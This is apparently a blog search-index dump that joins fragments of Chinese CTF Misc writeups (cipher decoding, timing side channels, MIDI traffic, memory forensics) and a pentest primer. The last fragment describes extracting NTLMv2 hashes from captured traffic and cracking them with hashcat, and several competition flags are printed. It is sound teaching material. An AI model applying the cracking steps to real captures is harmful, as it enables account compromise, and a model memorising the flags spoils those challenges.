你这柚子这么小 硬是因为新鲜你要软的还是糯的 你这柚子这么小 这西瓜能吃吗看起来有点不熟 硬是因为新鲜你要软的还是糯的 这西瓜能吃吗看起来有点不熟 你这柚子这么小 不熟的西瓜怎么可能你这就是等着吃甜的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 硬是因为新鲜你要软的还是糯的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 小巧的才好吃你要大个的还是好吃的 你这柚子这么小 大个儿才值钱你要不要 硬是因为新鲜你要软的还是糯的 小巧的才好吃你要大个的还是好吃的 硬是因为新鲜你要软的还是糯的 这桃子怎么这么硬 你这柚子这么小 硬是因为新鲜你要软的还是糯的 硬是因为新鲜你要软的还是糯的 你这柚子这么小 硬是因为新鲜你要软的还是糯的 这桃子怎么这么硬 小巧的才好吃你要大个的还是好吃的 硬是因为新鲜吃着有口感 根据密文的格式猜测，前面得到的 16 行数据是对应到十六进制的 0-f 因此我们写个脚本解码一下即可得到最后的 flag： flag{3e25960a79dbc69b674cd4ec67a72c62} table = { \"你这苹果怎么这么大\": '0', \"大个儿才值钱你要不要\": '1', \"这桃子怎么这么硬\": '2', \"硬是因为新鲜你要软的还是糯的\": '3', \"这西瓜能吃吗看起来有点不熟\": '4', \"不熟的西瓜怎么可能你这就是等着吃甜的\": '5', \"你这柚子这么小\": '6', \"小巧的才好吃你要大个的还是好吃的\": '7', \"这橙子怎么这么酸\": '8', \"酸才是正宗的橙子你要是甜的去别家看\": '9', \"这香蕉有点弯\": 'a', \"弯的香蕉更甜你不懂\": 'b', \"你这梨子是不是有点硬\": 'c', \"硬是因为新鲜吃着有口感\": 'd', \"这葡萄怎么这么小\": 'e', \"小的葡萄更浓缩甜味\": 'f' } with open('flag.txt','r') as f: data = f.read().split() res = '' for item in data: res += table[item] print(res) print(bytes.fromhex(res)) # 666c61677b33653235393630613739646263363962363734636434656336376137326336327d # b'flag{3e25960a79dbc69b674cd4ec67a72c62}' 题目名称 sudoku 参考 2023 年古剑山的那道数独： https://www.cnblogs.com/xiaoqi-ctf/p/17889281.html 出题人竟然连 flag 都不改：flag{4e4d6c332b6fe62a63afe56171fd3725} 题目名称 hundred 附件给了一个attachment，010 打开发现是个数据逆置后的 zip with open('attachment','rb') as f: data = f.read()[::-1] with open('1.zip','wb') as f: f.write(data) 利用以上脚本还原后解压，可以得到joke.txt还有flag2 joke.txt 中的内容如下： 知识点不够，增加体积来凑 010 打开 flag2，发现又是个数据逆置后的 zip 用之前的脚本恢复后发现里面还是个数据逆置的 zip，猜测是套娃 因此我们写个脚本解套即可 import os import zipfile def reverse_bytes_file(input_file, output_file): with open(input_file, \"rb\") as f: data = f.read() reversed_data = data[::-1] with open(output_file, \"wb\") as f: f.write(reversed_data) print(f\"[+] 逆序完成: {output_file}\") def try_unzip(zip_path, extract_dir): try: with zipfile.ZipFile(zip_path, 'r') as zip_ref: zip_ref.extractall(extract_dir) print(f\"[+] 解压成功: {zip_path}\") return True except Exception: print(f\"[!] 解压失败: {zip_path}\") return False def process_layer(start_file): current_file = start_file layer = 2 while True: reversed_file = f\"layer{layer}_restored.zip\" extract_dir = f\"layer{layer}_unzipped\" reverse_bytes_file(current_file, reversed_file) ok = try_unzip(reversed_file, extract_dir) if not ok: print(\"[!] 无法继续解压，可能不是逆序压缩包","date":"2025-12-11","objectID":"/posts/380aa02/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 古剑山全国大学生网络攻防大赛 Misc Writeup","uri":"/posts/380aa02/"},{"categories":["Writeup"],"content":"跟天枢Dubhe一起打了一下，感觉拟态决赛的Misc题还挺有意思的 题目附件：本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 泄漏的时间与电码 题目描述： 你苦苦寻觅的东西或许就藏在他最显眼的地方 hint1：ModR/M 附件给了如下几个文件 chal 是一个 elf 可执行文件 chal.py 中的内容如下： import time import random import sys class SecureTypewriter: def __init__(self): self.lfsr = 0x92 self.time_unit = 0.005 self.jitter = 0.001 self.base_overhead = 10 self.branch_penalty = 30 def step_lfsr(self): bit = ((self.lfsr \u003e\u003e 0) ^ (self.lfsr \u003e\u003e 2) ^ (self.lfsr \u003e\u003e 3) ^ (self.lfsr \u003e\u003e 4)) \u0026 1 self.lfsr = (self.lfsr \u003e\u003e 1) | (bit \u003c\u003c 7) return self.lfsr def scramble(self, val): return ((val * 0x1F) + 0x55) \u0026 0xFF def process_char(self, char): c = ord(char) k = self.step_lfsr() val = c ^ k base_ops = self.scramble(val) current_ops = self.base_overhead + base_ops if base_ops % 2 != 0: current_ops += self.branch_penalty real_duration = current_ops * self.time_unit noise = random.uniform(-self.jitter, self.jitter) total_time = max(0, real_duration + noise) return total_time def process_text(self, text): timings = [] for char in text: elapsed = self.process_char(char) timings.append(elapsed) return timings if __name__ == \"__main__\": try: with open(\"flag.txt\", \"r\") as f: content = f.read().strip() except FileNotFoundError: print(\"Error: flag.txt not found.\") sys.exit(1) machine = SecureTypewriter() print(f\"Processing {len(content)} characters with SecureTypewriter v2.0...\") logs = machine.process_text(content) with open(\"timing.log\", \"w\") as f: for t in logs: f.write(f\"{t:.6f}\\n\") print(\"Processing complete. Timing data saved to timing.log\") timing.log 中的内容如下： 1.110270 0.924169 1.139244 0.670085 0.915054 1.154452 0.224613 0.329060 0.774615 0.279617 0.954166 0.430143 0.414914 1.224826 1.310686 1.265828 0.110950 1.225669 1.404647 0.575287 1.455927 0.975492 0.305642 0.835893 1.245893 0.569651 1.060266 0.149129 0.844243 1.294104 0.079101 0.914897 1.025389 0.270495 0.225577 0.654189 1.385665 0.755860 0.450597 0.950750 0.839268 1.015624 0.895000 0.794687 1.064966 1.200042 0.559413 0.980588 0.525959 0.514992 0.629261 0.489585 1.089786 0.880690 1.374392 0.789075 0.814771 1.455273 1.050996 0.234891 1.074220 0.099300 1.319762 0.935773 0.454985 0.425895 0.704892 1.095786 1.165433 1.295589 0.749113 0.885320 1.244904 0.659642 0.635889 0.435427 0.520476 0.870549 0.890145 1.125522 1.064915 0.399210 0.865873 发现是测信道攻击的相关内容 猜测需要根据这个 python 脚本和这个 log 恢复 flag.txt 中的内容 攻击的代码不复杂，直接遛一遛 GPT 就能恢复 TIME_UNIT = 0.005 BASE_OVERHEAD = 10 BRANCH_PENALTY = 30 LFSR_INIT = 0x92 def step_lfsr(lfsr): bit = ((lfsr \u003e\u003e 0) ^ (lfsr \u003e\u003e 2) ^ (lfsr \u003e\u003e 3) ^ (lfsr \u003e\u003e 4)) \u0026 1 lfsr = (lfsr \u003e\u003e 1) | (bit \u003c\u003c 7) return lfsr def scramble_inv(base_ops): return ((base_ops - 0x55) * 0xDF) \u0026 0xFF def is_printable_like(ch_val): if 32 \u003c= ch_val \u003c= 126: return True return False def recover_char_from_time(t, lfsr): ops = round(t / TIME_UNIT) x = ops - BASE_OVERHEAD candidates = [] base_ops_no_branch = x if 0 \u003c= base_ops_no_branch \u003c= 255 and base_ops_no_branch % 2 == 0: val = scramble_inv(base_ops_no_branch) c_val = val ^ lfsr if is_printable_like(c_val): candidates.append(chr(c_val)) base_ops_branch = x - BRANCH_PENALTY if 0 \u003c= base_ops_branch \u003c= 255 and base_ops_branch % 2 == 1: val = scramble_inv(base_ops_branch) c_val = val ^ lfsr if is_printable_like(c_val): candidates.append(chr(c_val)) raw_candidates = [] if 0 \u003c= base_ops_no_branch \u003c= 255 and base_ops_no_branch % 2 == 0: val = scramble_inv(base_ops_no_branch) raw_candidates.append(chr(val ^ lfsr)) if 0 \u003c= base_ops_branch \u003c= 255 and base_ops_branch % 2 == 1: val = scramble_inv(base_ops_branch) raw_candidates.append(chr(val ^ lfsr)) if raw_candidates: return raw_candidates[0] return \"?\" def recover_flag_from_log(path): with open(path, \"r\") as f: timings = [float(line.strip()) for line in f if line.strip()] lfsr = LFSR_INIT chars = [] for t in timings: lfsr = step_lfsr(lfsr) ch = recover_char_from_time(t, lfsr) chars.append(ch) return \"\".join(chars) if __name__ == \"__main__\": flag = recover_flag_from_log(\"timing.log\") print(flag) # h i j k l m n # 8 9 0 / - _ = # a b c d e f g # ","date":"2025-12-02","objectID":"/posts/353513a/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 强网拟态防御国际精英挑战赛线下总决赛 Misc Writeup","uri":"/posts/353513a/"},{"categories":["CTF"],"content":"越来越多 CTF 比赛的赛制都改成实战渗透了，因此想用这篇文章来学习并总结一下 前置基础知识 基础概念名词 域名 #一个例子： www.example.com com是顶级域名 example是二级域名 www是子域名 什么是DNS DNS（Domain Name System）是互联网中用于将域名解析为IP地址的系统。DNS工作原理是将域名转换为IP地址，以便能够在Internet上找到所需的网络资源。当您在Web浏览器中输入一个域名时，例如www.example.com，浏览器将发送一个DNS查询请求到DNS服务器，该服务器将返回与该域名相关联的IP地址。 DNS服务器是一种特殊的服务器，它维护着一个大型的分层的域名系统数据库。这个数据库分层结构允许DNS服务器从顶部开始查找域名，并根据域名的结构在下一级DNS服务器中查找更具体的信息，直到找到与域名相关联的IP地址。 使用DNS有许多好处。首先，它允许人们使用容易记忆的域名来访问Web资源，而不是使用难以记忆的IP地址。其次，它允许通过更改DNS记录来轻松地将网站移动到新的IP地址。最后，它允许管理员轻松地控制哪些IP地址与特定的域名相关联，从而允许在网络上更好地管理资源。 本地 HOSTS 与 DNS 的关系？ HOSTS是本地计算机上的一个文件，它包含了一个IP地址和一个或多个域名的对应关系。在计算机进行域名解析时，它会首先检查HOSTS文件中是否包含了所需的域名和对应的IP地址。如果存在，则会直接使用该IP地址，而不会发送DNS查询请求。因此，HOSTS文件可以被用于在本地计算机上设置静态的域名解析。 DNS则是一种分布式的域名解析系统，它包含了全球范围内的DNS服务器和域名系统。当计算机进行域名解析时，它会向本地DNS服务器发送一个查询请求，该服务器会递归地查找所需的IP地址，并返回给计算机。DNS系统可以提供更广泛的域名解析服务，同时也可以缓存已经解析过的域名，以提高解析速度。 在实际应用中，通常先检查本地HOSTS文件是否存在要解析的域名，如果不存在再通过DNS查询获取IP地址。因此，HOSTS和DNS是互补的系统，它们可以一起使用来提供更高效的域名解析服务。 CDN 是什么？与 DNS 的关系？ CDN（Content Delivery Network）是一种通过分布式节点技术来提高Web内容（如HTML、CSS、JavaScript、图片、视频等）传输速度的网络架构。CDN系统通常由多个位于不同地理位置的节点服务器组成，每个节点服务器上存储着相同的Web内容。当用户请求某个Web页面时，请求会被自动转发到离用户最近的节点服务器，从而加速页面的加载速度和提高用户体验。 CDN与DNS之间有紧密的关系，因为在用户请求Web页面时，首先会进行域名解析，确定该页面所在的服务器IP地址。如果该网站使用CDN，那么它的DNS记录通常会指向CDN的负载均衡服务器，而不是具体的Web服务器IP地址。在用户发起请求后，CDN的负载均衡服务器会根据用户所在的地理位置、网络带宽等因素，选择距离用户最近、性能最佳的节点服务器，将请求转发给该节点服务器进行处理，从而加速Web页面的传输。 总之，CDN可以通过分布式节点技术来提高Web内容传输速度，而DNS则可以指向CDN的负载均衡服务器，使得CDN可以根据用户的位置和网络带宽等因素，选择最优的节点服务器，从而提高Web页面的加载速度 常见的 DNS 安全攻击有哪些？ 以下是几种常见的DNS安全攻击： 1.DNS劫持：攻击者通过劫持DNS查询，篡改返回的DNS响应，导致用户访问的是恶意站点，从而实现钓鱼、恶意软件分发等攻击。 2.DNS缓存投毒：攻击者利用DNS缓存服务器的漏洞，向缓存服务器注入伪造的DNS响应，导致缓存服务器上的所有用户都被指向恶意站点，从而实现大规模的攻击。 3.DNS重定向：攻击者通过篡改DNS响应，将合法域名的解析结果指向恶意站点，从而实现中间人攻击。 4.DNS欺骗：攻击者向DNS服务器发送伪造的DNS请求，使其误认为该请求来自授权用户，进而返回伪造的DNS响应，从而实现DNS欺骗。 5.DNS放大攻击：攻击者利用存在放大效应的DNS协议（如DNS区域传送、DNS递归查询等），向DNS服务器发送大量的恶意请求，从而使DNS服务器发送大量的响应数据包，导致网络拥塞或服务瘫痪。 以上是几种常见的DNS安全攻击，为了保护DNS安全，可以采取一些措施，例如使用可信的DNS服务器、部署DNSSEC等。 后门 什么是后门？有那些后门？ 后门（Backdoor）是指一种未经授权的、通常是恶意的程序代码，被嵌入到计算机系统或应用程序中，以便攻击者可以利用它在系统中获得未经授权的访问权限。通常情况下，后门是由攻击者利用漏洞或者其他手段，在系统中植入的，以便在之后能够随时访问系统。 以下是一些常见的后门类型： 1.用户账号后门：攻击者利用系统或应用程序的漏洞，添加一个可以用于登录系统的特殊账户，然后就可以通过该账户访问系统的所有资源。 2.网络服务后门：攻击者利用网络服务软件的漏洞，将特定的代码嵌入到该服务中，然后就可以通过该服务来访问系统的其他资源。 3.操作系统后门：攻击者利用操作系统软件的漏洞，植入恶意代码以获取对操作系统的访问权限。 4.应用程序后门：攻击者利用应用程序的漏洞，植入恶意代码以获取对应用程序的访问权限。 5.物理后门：攻击者利用硬件设备的漏洞，植入恶意代码以获取对系统的访问权限，例如在计算机主板上添加特殊的芯片。 由于后门的性质比较隐蔽，所以检测和防范后门攻击一直都是网络安全工作者关注的重点。为了防范后门攻击，需要及时更新系统和应用程序的安全补丁，定期进行安全审计和漏洞扫描，并采取适当的安全措施，例如强化访问控制和加密技术等。 数据包拓展 HTTP响应码 以下是一些常见的HTTP响应码： 1xx - 信息性状态码：服务器已接收到请求，正在处理中 100 - 继续：客户端应该继续发送请求 101 - 切换协议：服务器正在切换协议，例如从HTTP到WebSocket 2xx - 成功状态码：服务器已成功处理请求 200 - OK：请求已成功处理 201 - Created：请求已成功处理并创建了新资源 204 - No Content：请求已成功处理，但没有返回任何内容 3xx - 重定向状态码：客户端需要执行额外的操作以完成请求 301 - Moved Permanently：所请求的资源已永久移动到新位置 302 - Found：所请求的资源已临时移动到新位置 304 - Not Modified：客户端可以使用缓存的版本 4xx - 客户端错误状态码：客户端发送的请求有误或无法完成请求 400 - Bad Request：请求有错误，服务器无法理解 401 - Unauthorized：需要进行身份验证 403 - Forbidden：禁止访问所请求的资源 404 - Not Found：所请求的资源不存在 5xx - 服务器错误状态码：服务器无法完成请求 500 - Internal Server Error：服务器遇到了一个意外的错误 502 - Bad Gateway：服务器充当网关或代理时，从上游服务器接收到无效响应 503 - Service Unavailable：服务器当前无法处理请求，通常是由于维护或过载造成的 通信基础知识 一、ip段/数字-如192.168.0.1/24是什么意思？ 后面这个24表示了我们的网络号的位数，也就是子网掩码中前24位为1。 192.168.1.1 /24 这个24就是网络号是24位。 即它的子网掩码是255.255.255.0 172.16.10.33/27 中的/27 也就是说子网掩码是255.255.255.224 即前27位全是1。 即子网掩码是：255.255.255.224 二、一个C类的ip段中，有多少个可用的ip地址？ 一个C类地址能容纳下254台主机 192.168.1.0-192.168.1.255，子网掩码为24位 从0-255总共有256个ip地址 其中其中0是网络ID（网段），255是广播地址 可用的ip地址只有： 192.168.1.1-192.168.1.254，共254个 网络地址和广播地址的用途： 网络地址：是识别网络ID用的，告诉你ip地址的网段。 广播地址：是专门用于同时向网络中所有工作站进行发送的一个地址，不能被路由转发。 信息收集 whois查询 爱站工具网 https://whois.aizhan.com/ 站长之家 https://whois.chinaz.com/ VirusTotal - Ho me https://www.virustotal.com/gui/home/upload 备案信息查询 ICP备案查询网 https://www.beianx.cn/ 天眼查 https://beian.tianyancha.com/ 站长工具 https://icp.chinaz.com/ 工业和信息化部 https://www.beian.gov.cn/portal/registerSystemInfo 收集敏感信息 使用搜索引擎的搜索语法 IP地址——使用ping指令 网站指纹识别 网站容器 脚本类型 数据库类型 可以使用nmap扫描端口进行判断 收集子域名信息 谷歌语法 site:ms08067.com 子域名爆破（在线网站\u0026本地工具） 网上搜在线爆破的网站即可 Maltego 根据DNS进行检测 收集常用端口信息 常用工具： N","date":"2025-11-18","objectID":"/posts/417c7ba/:0:0","tags":["CTF"],"title":"CTF-渗透测试","uri":"/posts/417c7ba/"},{"categories":["Writeup"],"content":"2025 浙江省大学生网络与信息安全竞赛 Misc Writeup 本文仅记录问的比较多的几道 Misc 题，其余题目的题解可参考 A1natas 的官方 Writeup： 初赛：https://mp.weixin.qq.com/s/MpmetBaIVQNhCUOnis63gQ 决赛：https://mp.weixin.qq.com/s/Vl86wmSNVhbZd7f9KSkh8g 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 小小作曲家 附件给了两个pcapng 流量包：attachment.pcapng 和 velato.pcapng 打开翻看一下发现是用 USB 传了 MIDI 数据 我们首先看这个attachment.pcapng，用 tshark 导出一下 midi 事件和对应的时间戳 tshark -r attachment.pcapng -T fields -Y 'usbaudio.midi.event' -e 'frame.time_epoch' -e 'usbaudio.midi.event' \u003e 1.txt 这里也是赛后和别的师傅们交流了一下才知道，这里要把时间戳也一起提取出来 要不然后面制作 mid 文件的时候会有问题，音符和时间就没法对应上，导致错失关键信息 参考链接：https://www.dr0n.top/posts/3802b37a/ 数据提取出来后的格式大致如下 我们写个脚本，用这些 midi 事件制作 mid 文件 import mido PPQ = 480 # 每四分音符的 tick 数 BPM = 120.0 # 节拍速度 MIN_DURATION_MS = 120.0 # 音符最小持续时间（毫秒） def parse_midi_events(input_file): with open(input_file, \"r\") as f: data = f.read() lines = data.splitlines() # print(lines) # 1722159321.608646000\\t904064 events = [] for line in lines: parts = line.split(\"\\t\") ts_str, hexdata = parts ts = float(ts_str) # 时间戳 b = bytes.fromhex(hexdata) status, note, velocity = b[0], b[1], b[2] if 0x90 \u003c= status \u003c= 0x9F and velocity \u003e 0: events.append((ts, \"note_on\", note, velocity)) elif 0x80 \u003c= status \u003c= 0x8F or (0x90 \u003c= status \u003c= 0x9F and velocity == 0): events.append((ts, \"note_off\", note, velocity)) return events def enforce_min_note_duration(events): # 按需延长 Note Off 的时间，保证音符不少于 MIN_DURATION_MS min_duration = MIN_DURATION_MS / 1000.0 active_notes = {} # 记录活跃的 note_on 事件 processed_events = [] for event in events: ts, event_type, note, velocity = event if event_type == \"note_on\": key = note active_notes[key] = (ts, event_type, note, velocity) processed_events.append(event) elif event_type == \"note_off\": key = note if key in active_notes: start_ts, _, _, _ = active_notes[key] min_end = start_ts + min_duration # 如果持续时间太短，延长 Note Off 的时间戳 if ts \u003c min_end: new_event = (min_end, event_type, note, velocity) processed_events.append(new_event) else: processed_events.append(event) del active_notes[key] else: processed_events.append(event) # 对处理后的事件按时间戳排序 processed_events.sort(key=lambda x: x[0]) return processed_events def build_midi(events, output_midi): # 确保所有音符都有最小持续时间 processed_events = enforce_min_note_duration(events) # 创建 MIDI 文件 mid = mido.MidiFile(ticks_per_beat=PPQ) track = mido.MidiTrack() mid.tracks.append(track) # 设置曲速 tempo_us = int(mido.bpm2tempo(BPM)) track.append(mido.MetaMessage(\"set_tempo\", tempo=tempo_us, time=0)) # 将事件转换为MIDI消息 prev_time = 0.0 start_time = processed_events[0][0] if processed_events else 0 for event in processed_events: ts, event_type, note, velocity = event rel_time = ts - start_time # 计算与前一个事件的时间差（秒） delta = max(0.0, rel_time - prev_time) # 将秒转换为 MIDI tick 数 ticks = int(round(mido.second2tick(delta, PPQ, tempo_us))) # 创建MIDI消息 if event_type == \"note_on\": msg = mido.Message(\"note_on\", note=note, velocity=velocity, time=ticks) elif event_type == \"note_off\": msg = mido.Message(\"note_off\", note=note, velocity=velocity, time=ticks) else: continue track.append(msg) prev_time = rel_time track.append(mido.MetaMessage(\"end_of_track\", time=0)) mid.save(output_midi) print(f\"[+] MIDI 文件已保存：{output_midi}（共 {len(processed_events)} 个事件）\") if __name__ == \"__main__\": input_data = \"1.txt\" out_midi = \"1.mid\" events = parse_midi_events(input_data) print(f\"[+] 提取到 {len(events)} 个 MIDI 事件\") build_midi(events, out_midi) 这个代码具体是什么意思呢？ 就是首先从我们 tshark 提取出来的数据中解析时间戳和 midi 时间 然后我们设置一个时间间隔：0.01，只要是小于这个时间间隔的，我们就认为是同时按下去的 其实可以认为就是乐理中的和弦，那么我们要怎么注意到这个规律的呢? 我们可以直接去看 tshark 中提取出来的midi数据(一共三字节)： 第一字节代表事件(note on/note off)，第二字节代表音符，第三字节代表力度 然后我们可以看到音符有很多连续的段，但是中间有时候会缺几个 这其实就对应到二维码中黑白像素的分布，连续的就是黑色像素的位置，缺失的则是白色像素 然后我们用 audacity 打开制作好的 mid 文件，稍微拉伸缩放一下，可以看到下图 发现是个倒置的二维码，但是很明显这样是没法扫描的，因此我们可以写个脚本把它保存到图片中 import numpy as np from PIL import Image import mido PPQ = 480 # 每四分音符的 tick 数 BPM = 120.0 # 节拍速度 MIN_DURATION_MS = 120.0 # 音符最小持续时间（毫秒） def parse_midi_events(input_file): with open(input_file, \"r\") as f: data = f.read() lines = data.splitlines() # print(lines) # 1722159321.608646","date":"2025-11-18","objectID":"/posts/8582ff7/:0:0","tags":["CTF","Writeup","Misc"],"title":"2025 浙江省大学生网络与信息安全竞赛 Misc Writeup","uri":"/posts/8582ff7/"},{"categories":["Writeup"],"content":"2025 台州市网络安全大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 pic DASCTF{bf5cd0774b599c12049ab8335eebe963} 题目名称 flow 简单的 PHP-Webshell 流量分析，HTTP 流44 中找到 flag DASCTF{54fc916b33576f8cde2c4147d89322e0} 题目名称 baby-misc 原题，参考链接：https://www.cnblogs.com/lpppp/p/18379812 附件给了一个 raw 内存镜像 我们先用 R-STUDIO 扫一下，在 DASCTF 用户的桌面上可以看到一个 hint.zip 还有一个 flag.zip 尝试提取出来，hint.zip 中有个 hint.txt，内容如下 calc??? 但是 flag.zip 是加密的 然后在 download 目录下发现另一个 flag(1).zip，里面有个 flag.txt，内容如下 flag{b1c16538-33f1-56b1-e620-b3a3f403a7f4} 发现是 fakeflag 然后尝试用 vol2 对内存镜像进行取证 python2 ~/CTF/volatility2-enhanced/vol.py -f baby_misc.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/Users/lunatic/Downloads/2025 台州市赛/baby_misc.raw/tempdir/MISC附件/baby_misc.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf8000404c070L Number of Processors : 2 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff8000404dd00L KPCR for CPU 1 : 0xfffff880009ee000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2023-09-15 05:56:26 UTC+0000 Image local date and time : 2023-09-15 13:56:26 +0800 扫了一下内存中的进程，发现有个 calc 进程，结合之前得到的提示，猜测这里可能有关键信息 python2 ~/CTF/volatility2-enhanced/vol.py -f baby_misc.raw --profile=Win7SP1x64 pslist Volatility Foundation Volatility Framework 2.6.1 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0xfffffa8000cc5040 System 4 0 81 478 ------ 0 2023-09-15 00:15:21 UTC+0000 0xfffffa8002508130 smss.exe 260 4 2 30 ------ 0 2023-09-15 00:15:21 UTC+0000 0xfffffa8002d35060 csrss.exe 340 328 9 311 0 0 2023-09-15 00:15:24 UTC+0000 0xfffffa8002d3a5b0 wininit.exe 380 328 3 77 0 0 2023-09-15 00:15:25 UTC+0000 0xfffffa8000cc8060 csrss.exe 396 388 8 307 1 0 2023-09-15 00:15:25 UTC+0000 0xfffffa8002d5c920 winlogon.exe 436 388 3 115 1 0 2023-09-15 00:15:25 UTC+0000 0xfffffa8002cf4b30 services.exe 484 380 6 188 0 0 2023-09-15 00:15:25 UTC+0000 0xfffffa8002daf560 lsass.exe 492 380 6 567 0 0 2023-09-15 00:15:25 UTC+0000 0xfffffa8002db1b30 lsm.exe 500 380 10 142 0 0 2023-09-15 00:15:26 UTC+0000 0xfffffa8002e239e0 svchost.exe 620 484 9 346 0 0 2023-09-15 00:15:26 UTC+0000 0xfffffa8002e64b30 svchost.exe 692 484 7 237 0 0 2023-09-15 00:15:27 UTC+0000 0xfffffa8002ea6ac0 svchost.exe 776 484 17 458 0 0 2023-09-15 00:15:28 UTC+0000 0xfffffa8002eec740 svchost.exe 820 484 11 294 0 0 2023-09-15 00:15:29 UTC+0000 0xfffffa8002f0a890 svchost.exe 848 484 31 1054 0 0 2023-09-15 00:15:29 UTC+0000 0xfffffa8002f78260 svchost.exe 984 484 13 332 0 0 2023-09-15 00:15:30 UTC+0000 0xfffffa8002f14b30 svchost.exe 288 484 14 500 0 0 2023-09-15 00:15:30 UTC+0000 0xfffffa8002fee060 spoolsv.exe 1052 484 12 271 0 0 2023-09-15 00:15:32 UTC+0000 0xfffffa800306e920 svchost.exe 1080 484 17 305 0 0 2023-09-15 00:15:32 UTC+0000 0xfffffa80031a8060 taskhost.exe 1456 484 9 174 1 0 2023-09-15 00:15:33 UTC+0000 0xfffffa80032ba060 svchost.exe 1548 484 6 93 0 0 2023-09-15 00:15:33 UTC+0000 0xfffffa80032d2b30 dwm.exe 1816 820 3 71 1 0 2023-09-15 00:15:34 UTC+0000 0xfffffa80032af060 explorer.exe 1824 1736 25 889 1 0 2023-09-15 00:15:34 UTC+0000 0xfffffa80033a2b30 QQBrowser.exe 2032 1824 2 77 1 1 2023-09-15 00:15:37 UTC+0000 0xfffffa80033a2060 YunDetectServi 2040 1824 16 237 1 1 2023-09-15 00:15:37 UTC+0000 0xfffffa800344db30 QQBrowser.exe 1992 1908 10 412 1 1 2023-09-15 00:15:38 UTC+0000 0xfffffa80034ceb30 BaiduNetdisk.e 2308 1824 46 1080 1 1 2023-09-15 00:15:42 UTC+0000 0xfffffa80034d9060 SearchIndexer. 2332 484 11 572 0 0 2023-09-15 00:15:42 UTC+0000 0xfffffa80030e8b30 BaiduNetdiskHo 1172 2308 27 300 1 1 2023-09-15 00:16:18 UTC+0000 0xfffffa800330d910 BaiduNetdiskHo 2824 2308 6 132 1 1 2023-09-15 00:16:23 UTC+0000 0xfffffa8000e69060 sppsv","date":"2025-11-06","objectID":"/posts/bfeb088/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 台州市网络安全大赛 Misc Writeup","uri":"/posts/bfeb088/"},{"categories":["Writeup"],"content":"本题是2025年华为杯中国研究生网络安全创新大赛实网对抗赛初赛的一道 Misc 的0解题 本场比赛的话 Misc 方向就只放了这一道题 赛后在 @Tr0jAn 和 @疏狂 两位师傅的帮助下顺利解出了这道题，在此感谢一下二位师傅 本文中涉及的具体题目附件可以进我的 知识星球 获取 题目名称 EZ_ATEXEC 参考链接： https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad 附件给了一个 pcapng 流量包，翻看一下发现有 DCERPC 协议中有 NTLMv2 认证的流量 NTLM 认证部分 直接用 NTLMRawUnHide.py 导出哈希值并尝试用 hashcat 爆破 hashcat 爆破可以得到密码：123qwe!@#Q 然后到 wireshark 中的 NTLMSSP 导入我们得到的密码 然后这个时候就可以发现DCERPC的流量已经被解密了（注意，这里要求 wireshark 版本在 4.0.6 以上，要不然会解码不完整） 我们可以依次到 TaskSchedulerService 的数据包中把完整的数据复制出来 就是这里要注意的是，因为是 Windows 系统下，所以这里的字符集是 utf-16le，复制出来 Cyberchef 解码的时候要注意 我们依次给他复制出来并解码 \u003cTask version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"\u003e \u003cRegistrationInfo\u003e \u003cDescription\u003eLeHo0nF4kLrREieG41Hy05KhBlwZcxLJBjrvA+BELbc4isUv6ogcPsMHpUUS8kgyo7laVMwY7FTz1/HRuSk6rDTjlFAEEoD5ASocUcb6ygJGLzGALrJR8n2VXvsK48gv/S5tWNzEmZ/cW4sC4TOfItmqq0MMRja+cNjgpmt8HXHFrTazVml0Tle4rDkt4ilmBaLjtWfeZaPIcfHiOgJNMsV529UxcEwxvyFmSzHYsVPUTOL0Upn0sBHHDzTbtCzlORXORm/8dhOmlvwNuDmaN481RNm0OpWx3g0iYfvdKFp3D4HdnUPoMWmpPFRkt0IUZ5TqgrIa/yWrN665bZMldUYKL9shnvDZ/p/e3Sc31nu1kB6aWFVirgJ7v/GARxFm2BVHNVMdO1ssaSeDM+QEBbKAkdDQQwPd+JBCsLiYZ6WmLMv1f9X+ekFYQte5CKI7gOSl/fhz3QWxvOgScrFa/SCda/oSyfrqXDm4KM8R982b2ZmB8en9llsIMfbodUaV2ABO551XLQbk+ct5fkUayzbxjhNIQvrO9VXp2HdIe/ZrlJUvimpr0uOvjKDGyOHhfotCMBNbtF6Umx1/corkCkT5DmXNlOFhc4MCPfP1yiT5KY12EsvRrerOJeaDI4FQXyrEuWL2GOyXp+14kTyVtyNTNO9Q4OuovP4NYvdNeAxwKbRuoCSMApY7hAdLmABaFIr/nN85la7jJxjZGVYeTPfySd4Pc0ZfHb9Dumgi5h9++81JwcGngjPLJJHZIaCuq3sdwwKwpAg+TO8uENyR6Lv7FSTPS26cx80GAUx7L6/dC0VODMKoG6o48P9zG3XcbdHTAKe0uW0gR4x1NYD04ptyXc/xQvtVHUgZN3zaUjk+tWhbLIdb6AwPjtLZd1OF7RqzlgEXe58b8FnLNBhaXOs4NaOHAahz0RvIodjTi1t+4onlZdHPHmNcTT63XutQvD/ne9EPPUSl7U1/BBmc+P29/RYYWZPOvOQknOp6IJOeGtSdIHM0u03dWhgQ68liuystaMc2sowaHemCckf531rxqqQM1sfOKQYa2+zTgVUOa0BeztuxbCtSHkQtLde1l9PZ/VrD+ypOMCa7Ng1gme9KOVS3Ndj7j+vDuaV3tqShx4FTVTVTK2BQXTY4kjavSZG56Du818iIsLs3Tx3sPIaV8k7cSKcXt8+UPjdltjvOdtY3jAWm4iIm2tTsZq